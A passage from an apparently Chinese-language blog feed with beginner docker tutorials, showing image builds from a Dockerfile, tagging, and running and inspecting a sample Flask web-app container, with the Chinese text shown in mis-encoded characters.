-D</span><br></pre></td></tr></table></figure><p>From:è¡¨ç¤ºä½¿ç”¨å“ªä¸ªé•œåƒæº RUN:è¡¨ç¤ºå‘Šè¯‰dockeråœ¨é•œåƒé‡Œé¢æ‰§è¡Œä»€ä¹ˆå‘½ä»¤ ç„¶åä½¿ç”¨docker build -t xxx .æ¥åˆ›å»º æ³¨æ„,ä¸è¦å¿˜è®°æŒ‡ä»¤æœ€åçš„ä¸€ä¸ªç‚¹,ç‚¹è¡¨ç¤ºdockerfileåœ¨å½“å‰ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker build -t blacsheep/ubuntu:dockerfile .</span><br><span class="line">ERRO[0036] Can&#x27;t add file /home/blacsheep/.gnupg/S.gpg-agent to tar: archive/tar: sockets not supported </span><br><span class="line">Sending build context to Docker daemon   2.19GB</span><br><span class="line">Step 1/8 : From ubuntu:16.04</span><br><span class="line">16.04: Pulling from library/ubuntu</span><br><span class="line">1be7f2b886e8: Already exists </span><br><span class="line">6fbc4a21b806: Already exists </span><br><span class="line">c71a6f8e1378: Already exists </span><br><span class="line">4be3072e5a37: Already exists </span><br><span class="line">06c6d2f59700: Already exists </span><br><span class="line">Digest: sha256:2b80e7fbfd1b0a3784dd0e55fb6f2750ebc33e596c2ccee5201ecf018ac5ae05</span><br><span class="line">Status: Downloaded newer image for ubuntu:16.04</span><br><span class="line"> ---&gt; 0458a4468cbc</span><br><span class="line">Step 2/8 : RUN /bin/echo &#x27;root:123456&#x27; chpasswd</span><br><span class="line"> ---&gt; Running in b3d12aa12f6c</span><br><span class="line">Removing intermediate container b3d12aa12f6c</span><br><span class="line"> ---&gt; 99c6e9ccdd81</span><br><span class="line">Step 3/8 : RUN useradd blacsheep</span><br><span class="line"> ---&gt; Running in fe025de84d56</span><br><span class="line">Removing intermediate container fe025de84d56</span><br><span class="line"> ---&gt; e5180f2047b3</span><br><span class="line">Step 4/8 : RUN /bin/echo &#x27;blacsheep:123456&#x27; chpasswd</span><br><span class="line"> ---&gt; Running in aa3c30d8f07b</span><br><span class="line">Removing intermediate container aa3c30d8f07b</span><br><span class="line"> ---&gt; 9bda89fa8c14</span><br><span class="line">Step 5/8 : RUN /bin/echo -e &quot;LANG=\&quot;en_US.UTF-8\&quot;&quot; &gt;/etc/default/local</span><br><span class="line"> ---&gt; Running in d63a51e6d430</span><br><span class="line">Removing intermediate container d63a51e6d430</span><br><span class="line"> ---&gt; a3b879d7090e</span><br><span class="line">Step 6/8 : EXPOSE 22</span><br><span class="line"> ---&gt; Running in d2f15040553b</span><br><span class="line">Removing intermediate container d2f15040553b</span><br><span class="line"> ---&gt; 65916c8dda3e</span><br><span class="line">Step 7/8 : EXPOSE 80</span><br><span class="line"> ---&gt; Running in 62dde9991ee4</span><br><span class="line">Removing intermediate container 62dde9991ee4</span><br><span class="line"> ---&gt; 5bf05e8d377f</span><br><span class="line">Step 8/8 : CMD /usr/sbin/sshd -D</span><br><span class="line"> ---&gt; Running in 62528b637ebc</span><br><span class="line">Removing intermediate container 62528b637ebc</span><br><span class="line"> ---&gt; 7ba34ce933fb</span><br><span class="line">Successfully built 7ba34ce933fb</span><br><span class="line">Successfully tagged blacsheep/ubuntu:dockerfile</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED              SIZE</span><br><span class="line">blacsheep/ubuntu    dockerfile          7ba34ce933fb        About a minute ago   112MB</span><br><span class="line">blacsheep/ubuntu    v1                  3846343d3b39        22 minutes ago       107MB</span><br><span class="line">httpd               latest              2e202f453940        2 days ago           179MB</span><br><span class="line">ubuntu              16.04               0458a4468cbc        2 days ago           112MB</span><br><span class="line">ubuntu              latest              0458a4468cbc        2 days ago           112MB</span><br><span class="line">ubuntu              16.10               7d3f705d307c        6 months ago         107MB</span><br><span class="line">training/webapp     latest              6fae60ef3446        2 years ago          349MB</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep#</span><br></pre></td></tr></table></figure><p>æœ€åçš„docker imagesä¹Ÿå¯ä»¥çœ‹å‡ºé•œåƒå®‰è£…æˆåŠŸäº† ç„¶åè‡³äºç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker run -i -t blacsheep/ubuntu:dockerfile /bin/bash</span><br><span class="line">root@1b52c348bf31:/# id blacsheep</span><br><span class="line">uid=1000(blacsheep) gid=1000(blacsheep) groups=1000(blacsheep)</span><br><span class="line">root@1b52c348bf31:/# </span><br></pre></td></tr></table></figure><h3 id="è®¾ç½®é•œåƒæ ‡ç­¾">è®¾ç½®é•œåƒæ ‡ç­¾</h3><p>ä½¿ç”¨docker tagå‘½ä»¤ æ¯”å¦‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker tag 7ba34ce933fb blacsheep/ubuntu:practice</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">blacsheep/ubuntu    dockerfile          7ba34ce933fb        19 minutes ago      112MB</span><br><span class="line">blacsheep/ubuntu    practice            7ba34ce933fb        19 minutes ago      112MB</span><br><span class="line">blacsheep/ubuntu    v1                  3846343d3b39        40 minutes ago      107MB</span><br><span class="line">httpd               latest              2e202f453940        2 days ago          179MB</span><br><span class="line">ubuntu              16.10               7d3f705d307c        6 months ago        107MB</span><br><span class="line">training/webapp     latest              6fae60ef3446        2 years ago         349MB</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°blacsheep/ubuntuå¤šäº†ä¸€ä¸ªpracticeæ ‡ç­¾.</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>dockeræ–°æ‰‹å…¥é—¨(2)ä¹‹å®¹å™¨ä½¿ç”¨</title>
      <link href="/2018/01/27/docker%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8%E4%B9%8B%E5%AE%B9%E5%99%A8%E4%BD%BF%E7%94%A8/"/>
      <url>/2018/01/27/docker%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8%E4%B9%8B%E5%AE%B9%E5%99%A8%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="dockerå®¢æˆ·ç«¯">dockerå®¢æˆ·ç«¯</h3><p>dockerå®¢æˆ·ç«¯çš„å‘½ä»¤å¯ä»¥ç”¨dockerå‘½ä»¤æ¥æŸ¥çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker</span><br></pre></td></tr></table></figure><p>ç„¶åå¯ä»¥é€šè¿‡docker command --helpæ¥æŸ¥çœ‹å…·ä½“å‘½ä»¤çš„ä½¿ç”¨ æ¯”å¦‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker stats --help</span><br><span class="line"></span><br><span class="line">Usage:  docker stats [OPTIONS] [CONTAINER...]</span><br><span class="line"></span><br><span class="line">Display a live stream of container(s) resource usage statistics</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -a, --all             Show all containers (default shows just running)</span><br><span class="line">      --format string   Pretty-print images using a Go template</span><br><span class="line">      --no-stream       Disable streaming stats and only pull the first result</span><br><span class="line">      --no-trunc        Do not truncate output</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><h3 id="è¿è¡Œä¸€ä¸ªwebåº”ç”¨">è¿è¡Œä¸€ä¸ªwebåº”ç”¨</h3><p>å°è¯•ä½¿ç”¨dockeræ¥æ„å»ºä¸€ä¸ªwebåº”ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker pull training/webapp</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from training/webapp</span><br><span class="line">e190868d63f8: Pull complete </span><br><span class="line">909cd34c6fd7: Pull complete </span><br><span class="line">0b9bfabab7c1: Pull complete </span><br><span class="line">a3ed95caeb02: Pull complete </span><br><span class="line">10bbbc0fc0ff: Pull complete </span><br><span class="line">fca59b508e9f: Pull complete </span><br><span class="line">e7ae2541b15b: Pull complete </span><br><span class="line">9dd97ef58ce9: Pull complete </span><br><span class="line">a4c1b0cb7af7: Pull complete </span><br><span class="line">Digest: sha256:06e9c1983bd6d5db5fba376ccd63bfa529e8d02f23d5079b8f74a616308fb11d</span><br><span class="line">Status: Downloaded newer image for training/webapp:latest</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker run -d -P training/webapp python app.py</span><br><span class="line">b9f2592e87cea8935e568cc401b090c50cfb01c486189aa44c893055ef751dcc</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„pullæ˜¯ä»ç½‘ä¸Šæ‹‰é•œåƒ,ç„¶ååé¢çš„runçš„å‚æ•°ä¸­,-dè®©å®¹å™¨åå°è¿è¡Œ,-Pè®©å®¹å™¨å†…éƒ¨ä½¿ç”¨çš„ç½‘ç»œç«¯å£æ˜ å°„åˆ°æˆ‘ä»¬çš„ä¸»æœº</p><h3 id="æŸ¥çœ‹webåº”ç”¨å®¹å™¨">æŸ¥çœ‹webåº”ç”¨å®¹å™¨</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                     NAMES</span><br><span class="line">b9f2592e87ce        training/webapp     &quot;python app.py&quot;     7 minutes ago       Up 7 minutes        0.0.0.0:32768-&gt;5000/tcp   clever_raman</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¤šäº†ä¸€äº›ç«¯å£çš„ä¿¡æ¯,å…¶å®æ˜¯dockerå¼€æ”¾çš„5000ç«¯å£(flaské»˜è®¤ç«¯å£)æ˜ å°„åˆ°äº†ä¸»æœºçš„32768ç«¯å£,æˆ‘ä»¬æµè§ˆå™¨è®¿é—®ä¸€ä¸‹ <img src="/images/2018/01/web-app1.png" alt="blacsheep" /> å½“ç„¶,ç«¯å£ä¹Ÿå¯ä»¥è‡ªå·±æŒ‡å®š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker run -d -p 5000:5000 training/webapp python app.py</span><br><span class="line">af7264cd0a971c40555a0dcf65dfa31bea74b92c497816e705cb009bdda8dc2d</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">af7264cd0a97        training/webapp     &quot;python app.py&quot;     6 seconds ago       Up 5 seconds        0.0.0.0:5000-&gt;5000/tcp   sharp_noyce</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ˜¯æŠŠå®¹å™¨å†…éƒ¨çš„5000ç«¯å£æ˜ å°„åˆ°äº†æˆ‘ä»¬æœ¬åœ°çš„5000ç«¯å£</p><h3 id="ç½‘ç»œç«¯å£æŸ¥çœ‹çš„å¿«æ·æ–¹å¼">ç½‘ç»œç«¯å£æŸ¥çœ‹çš„å¿«æ·æ–¹å¼</h3><p>docker pså½“ç„¶å¯ä»¥æŸ¥çœ‹ç«¯å£æƒ…å†µ,ä½†å…¶å®è¿˜æœ‰ä¸€ä¸ªå‘½ä»¤ä¹Ÿå¯ä»¥,docker portä¹Ÿå¯ä»¥æŸ¥çœ‹å›ºå®šidæˆ–åå­—çš„å®¹å™¨çš„ç«¯å£æ˜ å°„æƒ…å†µ æ¯”å¦‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker port af7264cd0a97</span><br><span class="line">5000/tcp -&gt; 0.0.0.0:5000</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåªæ˜¯ä¸€ç§å¿«æ·æ–¹å¼,ä½œä¸ºäº†è§£å§</p><h3 id="æŸ¥çœ‹webåº”ç”¨çš„æ—¥å¿—">æŸ¥çœ‹webåº”ç”¨çš„æ—¥å¿—</h3><p>æˆ‘ä»¬ä½¿ç”¨docker logs [idæˆ–åå­—]å¯ä»¥æŸ¥çœ‹å®¹å™¨å†…éƒ¨çš„æ ‡å‡†è¾“å‡º,å°±åƒæˆ‘ä»¬æœ¬åœ°è¿è¡Œflaskå°±ä¼šæœ‰*Running on xxxxä¸€æ · æˆ‘ä»¬è¿è¡Œä¸€ä¸‹docker logs -f [idæˆ–åå­—]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker logs -f af7264cd0a97</span><br><span class="line"> * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)</span><br><span class="line">172.17.0.1 - - [27/Jan/2018 07:08:00] &quot;GET / HTTP/1.1&quot; 200 -</span><br><span class="line">172.17.0.1 - - [27/Jan/2018 07:08:00] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå°±æ˜¯æˆ‘ä»¬åˆšåˆšçš„è®°å½• è¿™é‡Œçš„-fè¡¨ç¤ºå®æ—¶æ˜¾ç¤ºæ—¥å¿—,å°±åƒæˆ‘ä»¬å†è®¿é—®ä¸€ä¸‹127.0.0.1:5000æ—¥å¿—ä¼šè‡ªå·±å†™ä¸Šå»ä¸€æ ·</p><h3 id="æŸ¥çœ‹webåº”ç”¨å®¹å™¨çš„è¿›ç¨‹">æŸ¥çœ‹webåº”ç”¨å®¹å™¨çš„è¿›ç¨‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker top af7264cd0a97</span><br><span class="line">UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD</span><br><span class="line">root                3844                3827                0                   15:01               ?                   00:00:00            python app.py</span><br></pre></td></tr></table></figure><h3 id="æ£€æŸ¥webåº”ç”¨ç¨‹åº">æ£€æŸ¥webåº”ç”¨ç¨‹åº</h3><p>ä½¿ç”¨docker inspect xxx æ¯”å¦‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker inspect af7264cd0a97</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;Id&quot;: &quot;af7264cd0a971c40555a0dcf65dfa31bea74b92c497816e705cb009bdda8dc2d&quot;,</span><br><span class="line">        &quot;Created&quot;: &quot;2018-01-27T07:01:48.216732532Z&quot;,</span><br><span class="line">        &quot;Path&quot;: &quot;python&quot;,</span><br><span class="line">        &quot;Args&quot;: [</span><br><span class="line">            &quot;app.py&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;State&quot;: &#123;</span><br><span class="line">            &quot;Status&quot;: &quot;running&quot;,</span><br><span class="line">            &quot;Running&quot;: true,</span><br><span class="line">            &quot;Paused&quot;: false,</span><br><span class="line">            &quot;Restarting&quot;: false,</span><br><span class="line">            &quot;OOMKilled&quot;: false,</span><br><span class="line">            &quot;Dead&quot;: false,</span><br><span class="line">            &quot;Pid&quot;: 3844,</span><br><span class="line">            &quot;ExitCode&quot;: 0,</span><br><span class="line">            &quot;Error&quot;: &quot;&quot;,</span><br><span class="line">            &quot;StartedAt&quot;: &quot;2018-01-27T07:01:48.855558432Z&quot;,</span><br><span class="line">            &quot;FinishedAt&quot;: &quot;0001-01-01T00:00:00Z&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Image&quot;: &quot;sha256:6fae60ef344644649a39240b94d73b8ba9c67f898ede85cf8e947a887b3e6557&quot;,</span><br><span class="line">        &quot;ResolvConfPath&quot;: &quot;/var/lib/docker/containers/af7264cd0a971c40555a0dcf65dfa31bea74b92c497816e705cb009bdda8dc2d/resolv.conf&quot;,</span><br><span class="line">        &quot;HostnamePath&quot;: &quot;/var/lib/docker/containers/af7264cd0a971c40555a0dcf65dfa31bea74b92c497816e705cb009bdda8dc2d/hostname&quot;,</span><br><span class="line">        &quot;HostsPath&quot;: &quot;/var/lib/docker/containers/af7264cd0a971c40555a0dcf65dfa31bea74b92c497816e705cb009bdda8dc2d/hosts&quot;,</span><br><span class="line">        &quot;LogPath&quot;: &quot;/var/lib/docker/containers/af7264cd0a971c40555a0dcf65dfa31bea74b92c497816e705cb009bdda8dc2d/af7264cd0a971c40555a0dcf65dfa31bea74b92c497816e705cb009bdda8dc2d-json.log&quot;,</span><br><span class="line">        &quot;Name&quot;: &quot;/sharp_noyce&quot;,</span><br><span class="line">        &quot;RestartCount&quot;: 0,</span><br><span class="line">        &quot;Driver&quot;: &quot;overlay2&quot;,</span><br><span class="line">        &quot;Platform&quot;: &quot;linux&quot;,</span><br><span class="line">        &quot;MountLabel&quot;: &quot;&quot;,</span><br><span class="line">        &quot;ProcessLabel&quot;: &quot;&quot;,</span><br><span class="line">        &quot;AppArmorProfile&quot;: &quot;docker-default&quot;,</span><br><span class="line">        &quot;ExecIDs&quot;: null,</span><br><span class="line">        &quot;HostConfig&quot;: &#123;</span><br><span class="line">            &quot;Binds&quot;: null,</span><br><span class="line">            &quot;ContainerIDFile&quot;: &quot;&quot;,</span><br><span class="line">            &quot;LogConfig&quot;: &#123;</span><br><span class="line">                &quot;Type&quot;: &quot;json-file&quot;,</span><br><span class="line">                &quot;Config&quot;: &#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;NetworkMode&quot;: &quot;default&quot;,</span><br><span class="line">            &quot;PortBindings&quot;: &#123;</span><br><span class="line">                &quot;5000/tcp&quot;: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;HostIp&quot;: &quot;&quot;,</span><br><span class="line">                        &quot;HostPort&quot;: &quot;5000&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;RestartPolicy&quot;: &#123;</span><br><span class="line">                &quot;Name&quot;: &quot;no&quot;,</span><br><span class="line">                &quot;MaximumRetryCount&quot;: 0</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;AutoRemove&quot;: false,</span><br><span class="line">            &quot;VolumeDriver&quot;: &quot;&quot;,</span><br><span class="line">            &quot;VolumesFrom&quot;: null,</span><br><span class="line">            &quot;CapAdd&quot;: null,</span><br><span class="line">            &quot;CapDrop&quot;: null,</span><br><span class="line">            &quot;Dns&quot;: [],</span><br><span class="line">            &quot;DnsOptions&quot;: [],</span><br><span class="line">            &quot;DnsSearch&quot;: [],</span><br><span class="line">            &quot;ExtraHosts&quot;: null,</span><br><span class="line">            &quot;GroupAdd&quot;: null,</span><br><span class="line">            &quot;IpcMode&quot;: &quot;shareable&quot;,</span><br><span class="line">            &quot;Cgroup&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Links&quot;: null,</span><br><span class="line">            &quot;OomScoreAdj&quot;: 0,</span><br><span class="line">            &quot;PidMode&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Privileged&quot;: false,</span><br><span class="line">            &quot;PublishAllPorts&quot;: false,</span><br><span class="line">            &quot;ReadonlyRootfs&quot;: false,</span><br><span class="line">            &quot;SecurityOpt&quot;: null,</span><br><span class="line">            &quot;UTSMode&quot;: &quot;&quot;,</span><br><span class="line">            &quot;UsernsMode&quot;: &quot;&quot;,</span><br><span class="line">            &quot;ShmSize&quot;: 67108864,</span><br><span class="line">            &quot;Runtime&quot;: &quot;runc&quot;,</span><br><span class="line">            &quot;ConsoleSize&quot;: [</span><br><span class="line">                0,</span><br><span class="line">                0</span><br><span class="line">            ],</span><br><span class="line">            &quot;Isolation&quot;: &quot;&quot;,</span><br><span class="line">            &quot;CpuShares&quot;: 0,</span><br><span class="line">            &quot;Memory&quot;: 0,</span><br><span class="line">            &quot;NanoCpus&quot;: 0,</span><br><span class="line">            &quot;CgroupParent&quot;: &quot;&quot;,</span><br><span class="line">            &quot;BlkioWeight&quot;: 0,</span><br><span class="line">            &quot;BlkioWeightDevice&quot;: [],</span><br><span class="line">            &quot;BlkioDeviceReadBps&quot;: null,</span><br><span class="line">            &quot;BlkioDeviceWriteBps&quot;: null,</span><br><span class="line">            &quot;BlkioDeviceReadIOps&quot;: null,</span><br><span class="line">            &quot;BlkioDeviceWriteIOps&quot;: null,</span><br><span class="line">            &quot;CpuPeriod&quot;: 0,</span><br><span class="line">            &quot;CpuQuota&quot;: 0,</span><br><span class="line">            &quot;CpuRealtimePeriod&quot;: 0,</span><br><span class="line">            &quot;CpuRealtimeRuntime&quot;: 0,</span><br><span class="line">            &quot;CpusetCpus&quot;: &quot;&quot;,</span><br><span class="line">            &quot;CpusetMems&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Devices&quot;: [],</span><br><span class="line">            &quot;DeviceCgroupRules&quot;: null,</span><br><span class="line">            &quot;DiskQuota&quot;: 0,</span><br><span class="line">            &quot;KernelMemory&quot;: 0,</span><br><span class="line">            &quot;MemoryReservation&quot;: 0,</span><br><span class="line">            &quot;MemorySwap&quot;: 0,</span><br><span class="line">            &quot;MemorySwappiness&quot;: null,</span><br><span class="line">            &quot;OomKillDisable&quot;: false,</span><br><span class="line">            &quot;PidsLimit&quot;: 0,</span><br><span class="line">            &quot;Ulimits&quot;: null,</span><br><span class="line">            &quot;CpuCount&quot;: 0,</span><br><span class="line">            &quot;CpuPercent&quot;: 0,</span><br><span class="line">            &quot;IOMaximumIOps&quot;: 0,</span><br><span class="line">            &quot;IOMaximumBandwidth&quot;: 0</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;GraphDriver&quot;: &#123;</span><br><span class="line">            &quot;Data&quot;: &#123;</span><br><span class="line">                &quot;LowerDir&quot;: 